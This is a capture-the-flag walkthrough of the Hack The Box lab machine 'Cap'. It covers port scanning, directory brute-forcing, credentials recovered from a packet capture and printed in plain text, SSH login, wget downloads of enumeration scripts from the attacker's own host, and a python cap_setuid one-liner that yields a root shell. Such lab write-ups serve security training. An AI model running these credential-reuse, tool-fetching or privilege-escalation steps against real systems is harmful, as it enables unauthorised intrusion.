# Cap

URL: https://app.hackthebox.com/machines/Cap

Level: Easy

Date 4 Jul 2021

## Walkthrough

- [Enumeration](#enumeration)
- [User flag](#user-flag)
- [Privesc](#privesc)

# Enumeration

## NMAP

```
# Nmap 7.91 scan initiated Sun Jul  4 14:45:25 2021 as: nmap -T4 -p- -oN 01_nmap.txt 10.10.10.245
Nmap scan report for 10.10.10.245
Host is up (0.052s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

# Nmap done at Sun Jul  4 14:45:50 2021 -- 1 IP address (1 host up) scanned in 24.94 seconds
```

```
# Nmap 7.91 scan initiated Sun Jul  4 14:46:07 2021 as: nmap -T4 -A -p21,22,80 -oN 02_nmap.txt 10.10.10.245
Nmap scan report for 10.10.10.245
Host is up (0.044s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Sun, 04 Jul 2021 12:46:21 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest:
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Sun, 04 Jul 2021 12:46:15 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     <!DOCTYPE html>
|     <html class="no-js" lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Security Dashboard</title>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">
|     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
|     <link rel="stylesheet" href="/static/css/font-awesome.min.css">
|     <link rel="stylesheet" href="/static/css/themify-icons.css">
|     <link rel="stylesheet" href="/static/css/metisMenu.css">
|     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
|     <link rel="stylesheet" href="/static/css/slicknav.min.css">
|     <!-- amchar
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Sun, 04 Jul 2021 12:46:15 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, OPTIONS, HEAD
|     Content-Length: 0
|   RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
|     </body>
|_    </html>
|_http-server-header: gunicorn
|_http-title: Security Dashboard
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.91%I=7%D=7/4%Time=60E1AD98%P=x86_64-pc-linux-gnu%r(GetRe
SF:quest,4C56,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20S
SF:un,\x2004\x20Jul\x202021\x2012:46:15\x20GMT\r\nConnection:\x20close\r\n
SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x201938
SF:6\r\n\r\n<!DOCTYPE\x20html>\n<html\x20class=\"no-js\"\x20lang=\"en\">\n
SF:\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20
SF:<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x20\x
SF:20\x20\x20<title>Security\x20Dashboard</title>\n\x20\x20\x20\x20<meta\x
SF:20name=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1
SF:\">\n\x20\x20\x20\x20<link\x20rel=\"shortcut\x20icon\"\x20type=\"image/
SF:png\"\x20href=\"/static/images/icon/favicon\.ico\">\n\x20\x20\x20\x20<l
SF:ink\x20rel=\"stylesheet\"\x20href=\"/static/css/bootstrap\.min\.css\">\
SF:n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/font
SF:-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20h
SF:ref=\"/static/css/themify-icons\.css\">\n\x20\x20\x20\x20<link\x20rel=\
SF:"stylesheet\"\x20href=\"/static/css/metisMenu\.css\">\n\x20\x20\x20\x20
SF:<link\x20rel=\"stylesheet\"\x20href=\"/static/css/owl\.carousel\.min\.c
SF:ss\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/cs
SF:s/slicknav\.min\.css\">\n\x20\x20\x20\x20<!--\x20amchar")%r(HTTPOptions
SF:,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Sun,\x20
SF:04\x20Jul\x202021\x2012:46:15\x20GMT\r\nConnection:\x20close\r\nContent
SF:-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20GET,\x20OPTIONS,\x20
SF:HEAD\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,121,"HTTP/1\.1\x20
SF:400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20text/
SF:html\r\nContent-Length:\x20196\r\n\r\n<html>\n\x20\x20<head>\n\x20\x20\
SF:x20\x20<title>Bad\x20Request</title>\n\x20\x20</head>\n\x20\x20<body>\n
SF:\x20\x20\x20\x20<h1><p>Bad\x20Request</p></h1>\n\x20\x20\x20\x20Invalid
SF:\x20HTTP\x20Version\x20&#x27;Invalid\x20HTTP\x20Version:\x20&#x27;RTSP/
SF:1\.0&#x27;&#x27;\n\x20\x20</body>\n</html>\n")%r(FourOhFourRequest,189,
SF:"HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x20Su
SF:n,\x2004\x20Jul\x202021\x2012:46:21\x20GMT\r\nConnection:\x20close\r\nC
SF:ontent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20232\r
SF:\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\x20F
SF:inal//EN\">\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</h1>\
SF:n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20serv
SF:er\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20che
SF:ck\x20your\x20spelling\x20and\x20try\x20again\.</p>\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   44.12 ms 10.10.14.1
2   44.48 ms 10.10.10.245

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul  4 14:48:24 2021 -- 1 IP address (1 host up) scanned in 138.58 seconds
```

We explore a bit website:

![03_1](https://user-images.githubusercontent.com/42389836/156899292-e09220a9-54d9-4e0a-beb1-0212e1413921.png)

![03_2](https://user-images.githubusercontent.com/42389836/156899301-88512356-de00-416e-9004-4cd3c9433d4b.png)

It seems we have command execution:

```
curl http://10.10.10.245:80/netstat
```

![03_4](https://user-images.githubusercontent.com/42389836/156899385-1a75afff-95be-47a4-be94-0fef0719f062.png)

We run gobuster:

```
gobuster dir -u http://10.10.10.245:80 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o 03_gobuster.txt
/data                 (Status: 302) [Size: 208] [--> http://10.10.10.245/]
/ip                   (Status: 200) [Size: 17453]
/netstat              (Status: 200) [Size: 66252]
/capture              (Status: 302) [Size: 220] [--> http://10.10.10.245/data/1]
```

We explore a bit and we found `0.pcap` file.

We open it and we found some credentials:

```
user: nathan
pass: Buck3tH4TF0RM3!
```

# User-flag

We access throuh nathan and we grab user flag:

```
root@kali:/opt/htb/Cap# ssh 10.10.10.245 -l nathan
The authenticity of host '10.10.10.245 (10.10.10.245)' can't be established.
ECDSA key fingerprint is SHA256:8TaASv/TRhdOSeq3woLxOcKrIOtDhrZJVrrE0WbzjSc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.245' (ECDSA) to the list of known hosts.
nathan@10.10.10.245's password:
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-73-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jul  4 16:01:25 UTC 2021

  System load:           0.0
  Usage of /:            35.0% of 8.73GB
  Memory usage:          21%
  Swap usage:            0%
  Processes:             227
  Users logged in:       0
  IPv4 address for eth0: 10.10.10.245
  IPv6 address for eth0: dead:beef::250:56ff:feb9:ca66

  => There are 4 zombie processes.

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation




The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu May 27 11:21:27 2021 from 10.10.14.7
nathan@cap:~$
```

# Privesc

We transfer some tools through python web server:

```
nathan@cap:~$ wget http://10.10.14.5:8000/LinEnum.sh
--2021-07-04 16:03:25--  http://10.10.14.5:8000/LinEnum.sh
Connecting to 10.10.14.5:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: ‘LinEnum.sh’

LinEnum.sh                                      100%[=====================================================================================================>]  45.54K  --.-KB/s    in 0.09s

2021-07-04 16:03:26 (522 KB/s) - ‘LinEnum.sh’ saved [46631/46631]

nathan@cap:~$ wget http://10.10.14.5:8000/linpeas.sh
--2021-07-04 16:03:32--  http://10.10.14.5:8000/linpeas.sh
Connecting to 10.10.14.5:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 308544 (301K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                                      100%[=====================================================================================================>] 301.31K  1.43MB/s    in 0.2s

2021-07-04 16:03:32 (1.43 MB/s) - ‘linpeas.sh’ saved [308544/308544]

nathan@cap:~$ wget http://10.10.14.5:8000/linux-exploit-suggester.sh
--2021-07-04 16:03:37--  http://10.10.14.5:8000/linux-exploit-suggester.sh
Connecting to 10.10.14.5:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 85113 (83K) [text/x-sh]
Saving to: ‘linux-exploit-suggester.sh’

linux-exploit-suggester.sh                      100%[=====================================================================================================>]  83.12K  --.-KB/s    in 0.1s

2021-07-04 16:03:38 (794 KB/s) - ‘linux-exploit-suggester.sh’ saved [85113/85113]

nathan@cap:~$ wget http://10.10.14.5:8000/linuxprivchecker.py
--2021-07-04 16:03:45--  http://10.10.14.5:8000/linuxprivchecker.py
Connecting to 10.10.14.5:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 37195 (36K) [text/plain]
Saving to: ‘linuxprivchecker.py’

linuxprivchecker.py                             100%[=====================================================================================================>]  36.32K  --.-KB/s    in 0.06s

2021-07-04 16:03:45 (617 KB/s) - ‘linuxprivchecker.py’ saved [37195/37195]

nathan@cap:~$ ls -l
total 480
-rw-rw-r-- 1 nathan nathan  46631 Dec 25  2020 LinEnum.sh
-rw-rw-r-- 1 nathan nathan 308544 Dec 25  2020 linpeas.sh
-rw-rw-r-- 1 nathan nathan  85113 Dec 25  2020 linux-exploit-suggester.sh
-rw-rw-r-- 1 nathan nathan  37195 Dec 25  2020 linuxprivchecker.py
-r-------- 1 nathan nathan     33 Jul  4 15:21 user.txt
```

LinEnum.sh show something interesing:

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

Then we try to get root shell with python:

```
nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@cap:~# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)

root@cap:/root# cat root.txt
498620acb68b497d174c801f6b226e9b
```


